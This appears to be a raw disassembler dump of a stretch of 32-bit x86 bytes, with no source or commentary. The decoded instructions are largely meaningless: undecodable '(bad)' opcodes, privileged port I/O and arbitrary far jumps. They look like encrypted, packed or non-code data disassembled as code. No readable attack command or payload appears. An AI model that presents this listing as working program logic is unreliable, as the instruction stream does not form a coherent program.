  40609a:	add    DWORD PTR [edi+ebp*8-0x662e76e4],esi
  4060a1:	pop    edx
  4060a2:	cmp    ecx,DWORD PTR [ebp-0x1b]
  4060a5:	jge    0x406081
  4060a7:	sbb    ebp,ebp
  4060a9:	push   ss
  4060aa:	mov    ds:0x4fb2f6e9,eax
  4060af:	sti    
  4060b0:	stos   BYTE PTR es:[edi],al
  4060b1:	in     eax,dx
  4060b2:	adc    bl,BYTE PTR [ecx]
  4060b4:	test   al,0xc6
  4060b6:	ficom  WORD PTR [edi-0x1f24bec2]
  4060bc:	xchg   BYTE PTR [ebx+0xf],bh
  4060bf:	pop    edi
  4060c0:	cld    
  4060c1:	idiv   BYTE PTR [eax+0x17]
  4060c4:	sbb    eax,0xc431a8ae
  4060c9:	mov    eax,0x96c80b75
  4060ce:	les    ecx,FWORD PTR [eax]
  4060d0:	jmp    0x4060bc
  4060d2:	jno    0x406054
  4060d4:	jno    0x4060cd
  4060d6:	dec    esp
  4060d7:	outs   dx,DWORD PTR ds:[esi]
  4060d8:	push   edx
  4060d9:	jl     0x4060d8
  4060db:	js     0x4060d3
  4060dd:	xor    ah,BYTE PTR [edx+ebp*1+0x1171ac7]
  4060e4:	push   ebx
  4060e5:	in     eax,0x25
  4060e7:	cdq    
  4060e8:	pop    ss
  4060e9:	test   al,0x23
  4060eb:	or     eax,DWORD PTR [ebp-0x69]
  4060ee:	add    cl,ch
  4060f0:	jp     0x406159
  4060f2:	mov    al,ds:0xe9a00001
  4060f7:	dec    ecx
  4060f8:	xchg   esi,eax
  4060f9:	add    al,0xf8
  4060fb:	sahf   
  4060fc:	mov    ebp,0x10052bfd
  406101:	stos   BYTE PTR es:[edi],al
  406102:	jl     0x40616b
  406104:	js     0x40610d
  406106:	dec    esi
  406107:	clc    
  406108:	cmp    eax,0x35f00f62
  40610d:	fcom   DWORD PTR [esi+0x3aa95c59]
  406113:	jmp    0x5601:0x9206355a
  40611a:	adc    eax,0x206c78fa
  40611f:	int    0xc1
  406121:	mov    ebx,0x70400860
  406126:	inc    ebp
  406127:	cmp    al,0x47
  406129:	dec    edi
  40612a:	js     0x40615d
  40612c:	stc    
  40612d:	sti    
  40612e:	sbb    eax,0x3855582b
  406133:	cmp    dh,dl
  406135:	add    BYTE PTR [ecx+0x3a1103a3],al
  40613b:	nop
  40613c:	scas   eax,DWORD PTR es:[edi]
  40613d:	mov    esi,esp
  40613f:	adc    ecx,esp
  406141:	xlat   BYTE PTR ds:[ebx]
  406142:	or     BYTE PTR [edx],bl
  406144:	or     DWORD PTR [ebp-0x4b],ebp
  406147:	loopne 0x4060ce
  406149:	push   eax
  40614a:	or     DWORD PTR [esi-0x3997ff8d],ebx
  406150:	cld    
  406151:	popa   
  406152:	xchg   ebx,eax
  406153:	or     BYTE PTR [edx-0x1f],bh
  406156:	ss sbb eax,0x69bd0f83
  40615c:	pop    ds
  40615d:	mov    edi,0xc25370ee
  406162:	loopne 0x40618a
  406164:	hlt    
  406165:	jae    0x40611e
  406167:	scas   eax,DWORD PTR es:[edi]
  406168:	mov    edx,0x4d3bab24
  40616d:	mov    WORD PTR [edx],?
  40616f:	lea    ecx,[esi+0x317985f3]
  406175:	or     DWORD PTR [eax-0x4c],esp
  406178:	add    edi,DWORD PTR [edx]
  40617a:	sbb    DWORD PTR [esi-0xba980a],0x77
  406181:	in     al,0x9f
  406183:	xor    al,BYTE PTR [eax]
  406185:	or     BYTE PTR [eax+eax*1],0xd8
  406189:	test   BYTE PTR [esi+0x3e],dh
  40618c:	enter  0xffbf,0x1c
  406190:	(bad)  
  406191:	jle    0x40619e
  406193:	(bad)  
  406194:	(bad)  
  406196:	int3   
  406197:	out    dx,al
  406198:	push   0xb1cf31a0
  40619d:	dec    ecx
  40619e:	hlt    
  40619f:	fst    DWORD PTR [edx]
  4061a1:	jne    0x406193
  4061a3:	inc    esp
  4061a4:	imul   edx,edi,0x61
  4061a7:	mov    ecx,0x7d018c08
  4061ac:	and    DWORD PTR [edi-0x7847c2c],esp
  4061b2:	cmp    esi,ebp
  4061b4:	in     eax,0x5f
  4061b6:	sbb    al,0x84
  4061b8:	fsubr  DWORD PTR [ebx+0x4cbe550d]
  4061be:	push   edx
  4061bf:	aad    0x2e
  4061c1:	mov    BYTE PTR [ebx+0x23c49e39],bl
  4061c7:	clc    
  4061c8:	fwait
  4061c9:	and    eax,0x69980b83
  4061ce:	and    dh,BYTE PTR [ebp-0x313512fe]
  4061d4:	test   al,0xb0
  4061d6:	push   esp
  4061d7:	cmp    al,0x1b
  4061d9:	mov    WORD PTR [esi+0x14ccb678],ss
  4061df:	cmp    DWORD PTR [ecx-0x4100776c],ebp
  4061e5:	pop    edi
  4061e6:	shr    esp,cl
  4061e8:	mov    ds:0x76ac1b54,eax
  4061ed:	or     BYTE PTR [edx+ebx*1-0x19],cl
  4061f1:	neg    DWORD PTR [ebx]
  4061f3:	sub    cl,BYTE PTR [eax+eax*1]
  4061f6:	mov    ebp,0x2d1ea2bc
  4061fb:	aas    
  4061fc:	imul   ecx,DWORD PTR [ecx],0xffffffc0
  4061ff:	rcl    BYTE PTR [edx+0x40],1
  406202:	pusha  
  406203:	test   dh,ah
  406205:	aam    0xb6
  406207:	jle    0x4061f6
  406209:	sbb    eax,edi
  40620b:	dec    esi
  40620c:	inc    esp
  40620d:	lds    ebp,FWORD PTR [edx]
  40620f:	in     al,0x20
  406211:	adc    BYTE PTR [ecx-0x7ac77fd6],dh
  406217:	push   cs
  406218:	jle    0x406298
  40621a:	sbb    BYTE PTR [ebx+edx*4-0x2],ch
  40621e:	pop    esp
  40621f:	repnz push cs
  406221:	scas   al,BYTE PTR es:[edi]
  406222:	jns    0x406231
  406224:	cli    
  406225:	fistp  WORD PTR [edi]
  406228:	addr16 dec ecx
  40622a:	pusha  
  40622b:	mov    al,0xd0
  40622d:	inc    esi
  40622e:	mov    bh,0xc2
  406230:	lds    ebp,FWORD PTR [ecx+0x7aab1a19]
  406236:	aam    0x57
  406238:	arpl   bx,bx
  40623a:	cs scas al,BYTE PTR es:[edi]
  40623c:	sbb    DWORD PTR [esi],0xffffffea
  40623f:	pop    ds
  406240:	dec    edx
  406241:	push   eax
  406242:	jbe    0x4062a0
  406244:	int    0x85
  406246:	mov    esi,cs
  406248:	mov    esp,0x1efe76c
  40624d:	push   es
  40624e:	repnz xchg edi,eax
  406250:	(bad)  
  406251:	sub    eax,0x236e233e
  406256:	out    dx,al
  406257:	sub    bl,ah
  406259:	das    
  40625a:	(bad)  
  40625b:	adc    ch,bh
  40625d:	jge    0x4062a0
  40625f:	out    0x2c,eax
  406261:	cmp    eax,0xb3b44b3c
  406266:	dec    edi
  406267:	sbb    DWORD PTR [edi+0x1f],esp
  40626a:	cdq    
  40626b:	retf   0xc32b
  40626e:	sub    al,0x9f
  406270:	pop    es
  406271:	sar    DWORD PTR [esi-0x1959c6c4],1
  406277:	stos   DWORD PTR es:[edi],eax
  406278:	mov    WORD PTR [ebx+0x7b45a02],ds
  40627e:	repz mov al,ds:0x351b7fc8
  406284:	popa   
  406285:	push   ebp
  406286:	call   FWORD PTR [esp+edi*2+0x41]
  40628a:	test   eax,0xb155a25a
  40628f:	pop    eax
  406290:	mov    ds:0x45f33adf,eax
  406295:	push   ecx
  406296:	or     eax,0xaa0c1886
  40629b:	lds    edi,FWORD PTR [edx+0x49d96804]
  4062a1:	pop    esi
  4062a2:	not    DWORD PTR ds:0x866022ea
  4062a8:	add    DWORD PTR [eax-0x2f43e10f],0xe73c12a
  4062b2:	add    BYTE PTR [ecx+0x62],ah
  4062b5:	jg     0x4062ea
  4062b7:	xor    DWORD PTR [edx+0x42],edx
  4062ba:	aas    
  4062bb:	xchg   ebx,eax
  4062bc:	ins    DWORD PTR es:[edi],dx
  4062bd:	je     0x4062fc
  4062bf:	mov    ebp,DWORD PTR [edi-0x44608408]
  4062c5:	call   0x11c7:0x58c7f826
  4062cc:	jmp    0xe8675466
  4062d1:	retf   
  4062d2:	cwde   
  4062d3:	inc    eax
  4062d4:	jp     0x4062a8
  4062d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062d7:	dec    ecx
  4062d8:	pop    ebx
  4062d9:	ror    BYTE PTR [ecx-0x17],1
  4062dc:	fiadd  DWORD PTR [esi-0x39]
  4062df:	je     0x406349
  4062e1:	mov    fs,ecx
  4062e3:	dec    eax
  4062e4:	ja     0x406284
  4062e6:	test   al,0x2
  4062e8:	cld    
  4062e9:	jnp    0x4062c2
  4062eb:	jmp    0x232c22d7
  4062f0:	push   ss
  4062f1:	fisubr WORD PTR [eax+0x2f9824c1]
  4062f7:	jo     0x40629c
  4062f9:	dec    esp
  4062fa:	outs   dx,BYTE PTR ds:[esi]
  4062fc:	xchg   ebx,eax
  4062fd:	cmp    eax,edi
  4062ff:	hlt    
  406300:	lds    si,DWORD PTR [edi-0xb]
  406304:	or     eax,0xac002a0
  406309:	sub    eax,0xb3eb3b3a
  40630e:	and    edx,ebp
  406310:	push   cs
  406311:	call   0xbe8:0x3125d48c
  406318:	push   eax
  406319:	idiv   BYTE PTR [ecx-0x60]
  40631c:	add    DWORD PTR [eax],eax
  40631e:	ja     0x4062e3
  406320:	or     esp,ecx
  406322:	int3   
  406323:	push   edi
  406324:	and    BYTE PTR [ebp+ebp*1-0x7a],bl
  406328:	adc    cl,BYTE PTR [edi-0x56]
  40632b:	push   ebx
  40632c:	sbb    ch,BYTE PTR [eax+0x189b2600]
  406332:	add    dh,bl
  406334:	shl    eax,0xe1
  406337:	lock stos BYTE PTR es:[edi],al
  406339:	xchg   DWORD PTR [edi-0x45],esp
  40633c:	xchg   ebp,eax
  40633e:	call   DWORD PTR [ecx-0x3]
  406341:	sbb    ecx,DWORD PTR [edx+esi*8+0x5e]
  406345:	outs   dx,BYTE PTR ds:[esi]
  406346:	jnp    0x406394
  406348:	push   esp
  406349:	xchg   ebx,eax
  40634a:	mov    edx,0xa91873b2
  40634f:	cmp    bh,0xc6
  406352:	sub    cl,BYTE PTR [ebx]
  406354:	dec    ecx
  406355:	shl    ecx,0x32
  406358:	je     0x406335
  40635a:	jmp    0x4e81:0x6300010e
  406361:	rcr    ecx,cl
  406363:	fild   DWORD PTR [eax]
  406365:	ret    0xd1c6
  406368:	hlt    
  406369:	push   ebp
  40636a:	sub    edx,DWORD PTR [eax]
  40636c:	sar    BYTE PTR [eax+0x6a0f0b21],0xdb
  406373:	in     eax,dx
  406374:	test   eax,0x9002915e
  406379:	adc    al,0x4
  40637b:	xor    bh,bl
  40637d:	lods   al,BYTE PTR ds:[esi]
  40637e:	repz push es
  406380:	cmp    al,0xdd
  406382:	es in  eax,0x12
  406385:	je     0x4063bb
  406387:	jo     0x4063b4
  406389:	pop    ss
  40638a:	outs   dx,DWORD PTR ds:[esi]
  40638b:	retf   0xed31
  40638e:	je     0x406394
  406390:	mov    BYTE PTR ds:0x32a82a41,cl
  406396:	add    esp,DWORD PTR [edi+0x7c]
  406399:	and    eax,0x458c599
  40639e:	pop    ds
  40639f:	xchg   edi,eax
  4063a0:	imul   edx,DWORD PTR [ebp+0x354d194],0x6
  4063a7:	inc    eax
  4063a8:	mov    al,ds:0xf36d4a4a
  4063ad:	cmc    
  4063ae:	fdivr  st,st(1)
  4063b0:	jp     0x4063f0
  4063b2:	loopne 0x406367
  4063b4:	push   ecx
  4063b5:	add    eax,0x21f82de0
  4063ba:	iret   
  4063bb:	xchg   DWORD PTR [ebp-0x63de76d4],edx
  4063c1:	clc    
  4063c2:	shr    BYTE PTR [ecx+0x6645931],1
  4063c8:	mov    al,0xda
  4063ca:	repz mov ecx,0xc068bc13
  4063d0:	sbb    BYTE PTR [eax],cl
  4063d2:	xchg   edx,eax
  4063d3:	mov    eax,0x19dfe2d
  4063d8:	add    BYTE PTR [eax+eiz*1-0x7ab147db],bh
  4063df:	dec    esi
  4063e0:	sti    
  4063e1:	adc    eax,0x5751bdf9
  4063e6:	lea    esp,[eax+eax*4]
  4063e9:	shl    cl,1
  4063eb:	mov    ch,0x75
  4063ed:	pop    esi
  4063ee:	ins    BYTE PTR es:[edi],dx
  4063ef:	push   es
  4063f0:	sub    edx,DWORD PTR [esi+ecx*8+0x77]
  4063f4:	push   ebx
  4063f5:	stos   BYTE PTR es:[edi],al
  4063f6:	ins    DWORD PTR es:[edi],dx
  4063f7:	mov    ch,BYTE PTR [esi]
  4063f9:	sbb    ebp,DWORD PTR [edi+eiz*4+0xd]
  4063fd:	mov    ds:0x97725467,eax
  406402:	xchg   esi,eax
  406403:	push   es
  406404:	out    dx,al
  406405:	in     al,dx
  406406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406407:	inc    esi
  406408:	adc    ah,0x62
  40640b:	rol    al,cl
  40640d:	or     eax,DWORD PTR [ecx]
  40640f:	add    cl,bh
  406411:	sub    DWORD PTR [eax],eax
  406413:	pushf  
  406414:	or     eax,0x333683f3
  406419:	repz fistp WORD PTR [edi+0x263ba6e8]
  406420:	cmp    ah,BYTE PTR [eax+eax*8-0x6e]
  406424:	sub    DWORD PTR [esi+0x65f43ca0],0xffffffd0
  40642b:	cdq    
  40642c:	hlt    
  40642d:	xor    esi,DWORD PTR [ebx+ecx*1-0x33]
  406431:	ja     0x406436
  406433:	loop   0x4064a4
  406435:	or     DWORD PTR [eax+0x1564bb71],ecx
  40643b:	jl     0x40644f
  40643d:	cmp    ah,BYTE PTR [ecx]
  40643f:	lods   al,BYTE PTR ds:[esi]
  406440:	in     al,0x5a
  406442:	or     al,0x24
  406444:	addr16 out dx,al
  406446:	jno    0x4063e8
  406448:	adc    ecx,DWORD PTR [esi]
  40644a:	adc    DWORD PTR [esi+eiz*2+0x75],ebx
  40644e:	fcmovbe st,st(4)
  406450:	cmp    DWORD PTR [ebx-0x25],eax
  406453:	(bad)  
  406454:	es in  al,0xf8
  406457:	xchg   esi,eax
  406458:	inc    eax
  406459:	mov    ebx,0x9486cfff
  40645e:	pop    eax
  40645f:	aam    0x8d
  406461:	adc    DWORD PTR [ecx-0x66],ebp
  406464:	jnp    0x406484
  406466:	xchg   ebx,eax
  406467:	sub    ah,BYTE PTR [ebx+0x7f08c027]
  40646d:	xchg   ebx,eax
  40646e:	je     0x4064c8
  406470:	xchg   esp,eax
  406471:	in     al,dx
  406472:	out    dx,eax
  406473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406474:	jge    0x406409
  406476:	add    eax,0xa7a1ff11
  40647b:	cmp    cl,0x1
  40647e:	or     bh,bh
  406480:	cwde   
  406481:	repz add al,0xe5
  406484:	aas    
  406485:	das    
  406486:	sub    al,BYTE PTR [eax-0x715eb8bd]
  40648c:	lock outs dx,DWORD PTR ds:[esi]
  40648e:	jo     0x40642d
  406490:	mov    esp,0x931e18a3
  406495:	or     DWORD PTR [esi-0x43],ebp
  406498:	xor    ch,BYTE PTR [ecx+0x72ac15a0]
  40649e:	and    esi,DWORD PTR [eax]
  4064a0:	loop   0x40651b
  4064a2:	and    eax,0x10d28491
  4064a7:	mov    DWORD PTR [ecx+0x17],esp
  4064aa:	loopne 0x406503
  4064ac:	mov    bh,0x6f
  4064ae:	jns    0x406479
  4064b0:	loopne 0x406461
  4064b2:	jbe    0x40648b
  4064b4:	dec    eax
  4064b5:	ror    bl,1
  4064b7:	adc    DWORD PTR [ebp+0x60ed2a],edi
  4064bd:	(bad)  
  4064bf:	int    0x32
  4064c1:	pusha  
  4064c2:	jne    0x406515
  4064c4:	mov    dl,ch
  4064c6:	xchg   DWORD PTR [ebx+0x37b433e2],ebx
  4064cc:	pop    ebx
  4064cd:	jg     0x40649d
  4064cf:	and    al,0x0
  4064d1:	inc    ebx
  4064d2:	int    0x42
  4064d4:	xchg   bl,al
  4064d6:	mov    ds:0x93020105,al
  4064db:	add    ebp,DWORD PTR [edx+0x3c]
  4064de:	movntq (bad),mm1
  4064df:	out    0xca,eax
  4064e1:	sub    al,0xf2
  4064e3:	mov    dh,0x89
  4064e5:	(bad)  
  4064e7:	shl    DWORD PTR [ebx-0x1d1b83a3],1
  4064ed:	push   esi
  4064ee:	aad    0x92
  4064f0:	mov    WORD PTR [esi+0x2f540db],?
  4064f6:	jo     0x4064f9
  4064f8:	or     al,0x9e
  4064fa:	fs imul esp,eax,0x65018ebe
  406501:	xchg   ecx,eax
  406502:	aaa    
  406503:	xrelease mov BYTE PTR [edi],bh
  406506:	addr16 hlt 
  406508:	std    
  406509:	inc    ebp
  40650a:	jp     0x40657c
  40650c:	or     al,0x34
  40650e:	sub    eax,edx
  406510:	jno    0x406506
  406512:	jae    0x406555
  406514:	push   esi
  406515:	jge    0x40649b
  406517:	sub    BYTE PTR [edi-0x4f],dh
  40651a:	pop    edx
  40651b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40651c:	push   esp
  40651d:	mov    dl,0x3e
  40651f:	push   ds
  406520:	ja     0x4064ca
  406522:	mov    DWORD PTR ds:0x2c1d020d,edx
  406528:	repnz lahf 
  40652a:	sahf   
  40652b:	int3   
  40652c:	dec    edx
  40652d:	cmp    al,0x0
  40652f:	or     BYTE PTR [esi],dh
  406531:	sbb    BYTE PTR [ebp+eax*1+0x1a41992],dh
  406538:	js     0x4065b3
  40653a:	loopne 0x406545
  40653c:	shr    dl,0xaf
  40653f:	cli    
  406540:	pop    esi
  406541:	add    DWORD PTR [ebx],ecx
  406543:	out    0x0,al
  406545:	add    cl,bh
  406547:	mov    esp,0x4cc9b294
  40654c:	xchg   ebp,eax
  40654d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40654e:	imul   esp,DWORD PTR [esi+edx*8],0x3e2b922b
  406555:	sub    DWORD PTR [esi],0x1c
  406558:	push   esp
  406559:	xlat   BYTE PTR ds:[ebx]
  40655a:	(bad)  
  40655c:	xchg   ebp,eax
  40655d:	push   ebx
  40655e:	xlat   BYTE PTR ds:[ebx]
  40655f:	(bad)  
  406560:	and    BYTE PTR [eax-0x5c],ah
  406563:	add    BYTE PTR [ebx-0x65013d8a],bh
  406569:	jb     0x406582
  40656b:	sbb    bh,BYTE PTR [ebx-0x43efe7c0]
  406571:	push   eax
  406572:	and    al,dh
  406574:	pushf  
  406575:	add    DWORD PTR [eax-0x4d],eax
  406578:	or     al,0xb3
  40657a:	mov    al,0xa0
  40657c:	adc    bh,BYTE PTR [eax]
  40657e:	fneni(8087 only) 
  406580:	dec    edi
  406581:	xchg   BYTE PTR [ecx],al
  406583:	jmp    0xac92bc07
  406588:	pop    edi
  406589:	xchg   ebp,eax
  40658a:	jns    0x4065bc
  40658c:	stos   BYTE PTR es:[edi],al
  40658d:	xor    cl,cl
  40658f:	inc    edi
  406590:	std    
  406591:	call   0x8a77:0x94a0ed88
  406598:	fiadd  WORD PTR [ebx-0xd]
  40659b:	and    esi,DWORD PTR [ecx+0xc287f40]
  4065a1:	(bad)  
  4065a3:	jns    0x406556
  4065a5:	mov    eax,ds:0x51b12a07
  4065aa:	data16 mov al,ch
  4065ad:	mov    ebx,esp
  4065af:	xor    BYTE PTR [edx],ch
  4065b1:	cmp    DWORD PTR [esi+0x32833aac],ebp
  4065b7:	test   al,0xac
  4065b9:	fwait
  4065ba:	icebp  
  4065bb:	or     ah,al
  4065bd:	call   0x15f52d97
  4065c2:	(bad)  
  4065c3:	fist   WORD PTR [edx-0x3fd007be]
  4065c9:	mov    ds:0x61b9ba24,al
  4065ce:	jl     0x40664b
  4065d0:	inc    ebp
  4065d1:	inc    ecx
  4065d2:	push   0xaf0748f0
  4065d7:	in     al,0xf5
  4065d9:	imul   ecx,DWORD PTR [ecx+0x77],0xfd0ff885
  4065e0:	jbe    0x406655
  4065e2:	mov    esp,0x57597f4e
  4065e7:	xchg   ecx,eax
  4065e8:	inc    eax
  4065e9:	mov    bh,al
  4065eb:	jg     0x406609
  4065ed:	rol    DWORD PTR [edi+0x328d0f6e],1
  4065f3:	arpl   WORD PTR [edi+0x274953],si
  4065f9:	int    0xa9
  4065fb:	add    BYTE PTR [eax+0x58],cl
  4065fe:	rol    DWORD PTR [eax],0xc3
  406601:	add    esi,eax
  406603:	popa   
  406604:	dec    eax
  406605:	and    al,0x9a
  406607:	fldenv [ecx-0x76722326]
  40660d:	data16 or al,0x9a
  406610:	jl     0x40661e
  406612:	ror    BYTE PTR [eax+0x27],cl
  406615:	mov    bh,0xbd
  406617:	xchg   DWORD PTR [edi+0x3e4f0573],ebx
  40661d:	add    al,0xb4
  40661f:	inc    eax
  406620:	inc    edx
  406621:	js     0x4065c0
  406623:	stos   DWORD PTR es:[edi],eax
  406624:	sahf   
  406625:	sbb    eax,0xa45a23b4
  40662a:	stos   DWORD PTR es:[edi],eax
  40662b:	repz mov bl,0x7c
  40662e:	cs popf 
  406630:	push   ebp
  406631:	sub    al,dh
  406633:	mov    ecx,0x10336b8c
  406638:	rcr    BYTE PTR [eax-0x5f27eabe],0xdd
  40663f:	sbb    DWORD PTR [edi],0xffffffcb
  406642:	ret    0x5988
  406645:	xchg   edx,eax
  406646:	call   0xb237c997
  40664b:	cmc    
  40664c:	pop    ebx
  40664d:	arpl   WORD PTR [edi],cx
  40664f:	push   edx
  406650:	arpl   WORD PTR [edi-0x19a7fedb],sp
  406656:	arpl   WORD PTR [esi-0x4680e75c],di
  40665c:	mov    al,ds:0x12d1c538
  406661:	sub    DWORD PTR [ebx+0x2678be0d],0xbd5562a8
  40666b:	cli    
  40666c:	iret   
  40666d:	lea    esp,[ecx+0x7b47a555]
  406673:	add    BYTE PTR [edx+0x70840bfa],ah
  406679:	(bad)  
  40667a:	cmc    
  40667b:	sbb    BYTE PTR [di-0x4f],dl
  40667f:	or     BYTE PTR [edi-0xd0b270f],0x18
  406686:	sub    dl,BYTE PTR [edi+0x71]
  406689:	pop    ss
  40668a:	xchg   ecx,eax
  40668b:	mov    gs,WORD PTR [esi-0x227e233c]
  406691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406692:	jl     0x40667e
  406694:	mov    eax,0x82c62f6a
  406699:	aad    0x30
  40669b:	dec    eax
  40669c:	pop    es
  40669d:	mov    gs,WORD PTR [eax+0xef23314]
  4066a3:	xor    dl,BYTE PTR [edx-0x80]
  4066a6:	mov    dh,0x7d
  4066a8:	mov    ch,BYTE PTR ds:0x3f76ad61
  4066ae:	into   
  4066af:	clc    
  4066b0:	pop    ecx
  4066b1:	icebp  
  4066b2:	mov    eax,es
  4066b4:	xor    dl,bh
  4066b6:	outs   dx,BYTE PTR ds:[esi]
  4066b7:	push   ds
  4066b8:	jecxz  0x406671
  4066ba:	into   
  4066bb:	sub    dh,bh
  4066bd:	scas   al,BYTE PTR es:[edi]
  4066be:	cdq    
  4066bf:	mul    DWORD PTR [eax]
  4066c1:	mov    cl,0xb
  4066c3:	fs jmp 0x4066b9
  4066c6:	sbb    BYTE PTR [edi],bh
  4066c8:	cmp    BYTE PTR [esi+0x76],ch
  4066cb:	lahf   
  4066cc:	mov    ebp,0xc82001a4
  4066d1:	cld    
  4066d2:	jbe    0x406658
  4066d4:	pop    ebp
  4066d5:	push   eax
  4066d6:	pop    esp
  4066d7:	xor    al,0xcc
  4066d9:	jl     0x406667
  4066db:	mov    ecx,0x91d33fd
  4066e0:	cmp    ch,ah
  4066e2:	(bad)  
  4066e3:	and    al,0x65
  4066e5:	div    BYTE PTR [esi+eiz*8-0x5c]
  4066e9:	cld    
  4066ea:	mov    al,0x20
  4066ec:	or     DWORD PTR ds:0xb631325d,ebx
  4066f2:	xor    cl,BYTE PTR fs:[ebp+0x5613322c]
  4066f9:	repz jnp 0x4066b8
  4066fc:	jmp    0x6093:0x35f43441
  406703:	nop
  406704:	cmp    al,0xeb
  406706:	mov    esi,0xf8393d8e
  40670b:	repz mov al,ds:0x55e1ea7c
  406711:	mov    ch,0x48
  406713:	pop    ebx
  406714:	jge    0x4066fb
  406716:	push   edi
  406717:	mov    edi,0x6d0b5f5c
  40671c:	fxch   st(5)
  40671e:	out    0x40,eax
  406720:	stos   BYTE PTR es:[edi],al
  406721:	fadd   DWORD PTR [edx]
  406723:	aas    
  406724:	push   cs
  406725:	lahf   
  406726:	xchg   ebx,eax
  406727:	(bad)  
  406728:	or     al,0x48
  40672a:	fisub  DWORD PTR [ebx]
  40672c:	and    bh,dl
  40672e:	out    0x1f,eax
  406730:	in     eax,dx
  406731:	je     0x4066c8
  406733:	jne    0x40670f
  406735:	lea    ebp,[ecx]
  406737:	sbb    eax,0x5338c917
  40673c:	ins    DWORD PTR es:[edi],dx
  40673d:	sub    bh,BYTE PTR [ebx]
  40673f:	jo     0x406778
  406741:	jmp    0x406733
  406743:	mov    bh,0x68
  406745:	xlat   BYTE PTR ds:[ebx]
  406746:	in     al,0x1e
  406748:	or     al,0x9c
  40674a:	sahf   
  40674b:	mov    eax,0xb5460cd0
  406750:	jno    0x4067a3
  406752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406753:	or     ebp,DWORD PTR [eax-0x39cdd3de]
  406759:	clc    
  40675a:	outs   dx,DWORD PTR ds:[esi]
  40675c:	mov    ?,WORD PTR [esi+0x13b2dbd1]
  406762:	xchg   edx,eax
  406763:	ins    BYTE PTR es:[edi],dx
  406764:	add    edi,edx
  406766:	sbb    al,0x6e
  406768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406769:	and    eax,0x808ea305
  40676e:	inc    ecx
  40676f:	cmp    bh,al
  406771:	ja     0x40679d
  406773:	sub    edx,DWORD PTR [eax-0x36cc25c]
  406779:	popa   
  40677a:	(bad)  
  40677b:	daa    
  40677c:	mov    ecx,0x5f7efe26
  406781:	mov    esp,0x7805e1a7
  406786:	add    BYTE PTR ds:[eax],al
  406789:	adc    al,0x26
  40678b:	or     DWORD PTR [eiz*4+0xc2f8c00],eax
  406792:	cdq    
  406793:	mov    cl,ch
  406795:	dec    DWORD PTR [edi+esi*4]
  406798:	jp     0x406749
  40679a:	test   BYTE PTR [eax],bh
  40679c:	cmp    edx,DWORD PTR [edx+0x98904d0]
  4067a2:	xchg   edx,eax
  4067a3:	push   edx
  4067a4:	push   ebp
  4067a5:	(bad)  
  4067a6:	xchg   ebp,eax
  4067a7:	cdq    
  4067a8:	sub    ebx,DWORD PTR [eax]
  4067aa:	or     edx,ecx
  4067ac:	sar    ecx,1
  4067ae:	std    
  4067af:	push   esi
  4067b0:	fnstsw WORD PTR [edi+0x0]
  4067b3:	fld    QWORD PTR [edi+0x58]
  4067b6:	dec    esp
  4067b7:	dec    edi
  4067b8:	jae    0x406819
  4067ba:	sbb    DWORD PTR [esi-0x72],eax
  4067bd:	mov    ecx,DWORD PTR [edx-0x58]
  4067c0:	pop    esp
  4067c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067c3:	lahf   
  4067c4:	leave  
  4067c5:	aad    0x7d
  4067c7:	ins    BYTE PTR es:[edi],dx
  4067c8:	ins    BYTE PTR es:[edi],dx
  4067c9:	or     bh,BYTE PTR [esi-0x2ddea1b]
  4067cf:	mov    ebp,0xc0e7f959
  4067d4:	inc    esi
  4067d5:	test   eax,0xd5ac5302
  4067da:	push   edi
  4067db:	mov    ch,0xb1
  4067dd:	sbb    BYTE PTR [edx-0x80],dl
  4067e0:	and    DWORD PTR [ecx],edx
  4067e2:	test   ebp,0xb58ca013
  4067e8:	mov    ds:0x1762487e,al
  4067ed:	(bad)  
  4067ee:	aaa    
  4067ef:	iret   
  4067f0:	rcl    DWORD PTR [edx],1
  4067f2:	(bad)  
  4067f4:	inc    eax
  4067f5:	add    eax,esi
  4067f7:	shl    BYTE PTR [edx],0xb3
  4067fa:	push   cs
  4067fb:	inc    eax
  4067fc:	rcl    BYTE PTR [eax-0x2e71cc8e],0x79
  406803:	std    
  406804:	mov    es,WORD PTR [eax-0x5a694dc0]
  40680a:	addr16 es je 0x406869
  40680e:	mov    eax,0xaa38eff1
  406813:	inc    BYTE PTR [eax+0x7537f3fb]
  406819:	clc    
  40681a:	cmp    ah,dl
  40681c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40681d:	jg     0x406846
  40681f:	xchg   ebp,eax
  406820:	push   eax
  406821:	adc    eax,0x88ec0494
  406826:	ret    0x53e7
  406829:	or     bh,BYTE PTR [eax-0x2a]
  40682c:	add    BYTE PTR [eax+0x62113154],dh
  406832:	cs cwde 
  406834:	clc    
  406835:	xchg   ecx,eax
  406836:	lea    esi,[ecx]
  406838:	fidiv  DWORD PTR [ebp-0x4e]
  40683b:	sbb    DWORD PTR [ecx-0x6aa6832],0xfffffffa
  406842:	dec    edx
  406843:	sahf   
  406844:	outs   dx,BYTE PTR ds:[esi]
  406845:	out    0x6b,eax
  406847:	fadd   st(1),st
  406849:	dec    eax
  40684a:	mov    ebx,edi
  40684c:	cdq    
  40684d:	pusha  
  40684e:	push   cs
  40684f:	rcl    BYTE PTR [esi],1
  406851:	(bad)  
  406852:	outs   dx,DWORD PTR ds:[esi]
  406853:	fucomip st,st(4)
  406855:	iret   
  406856:	xchg   edi,eax
  406857:	add    dh,bl
  406859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40685a:	inc    esi
  40685b:	dec    edx
  40685c:	movhps xmm6,QWORD PTR [ebp+eiz*2+0x5f]
  406861:	sbb    ecx,eax
  406863:	push   esp
  406864:	inc    esi
  406865:	lahf   
  406866:	xor    DWORD PTR [esi],ecx
  406868:	data16 xor al,0x93
  40686b:	or     BYTE PTR [eax],cl
  40686d:	rol    BYTE PTR [edx-0x6c96ea15],0xb6
  406874:	add    DWORD PTR [edi+ebp*2-0x74],ebp
  406878:	js     0x4068b1
  40687a:	jge    0x406840
  40687c:	jmp    0x4ec7ee93
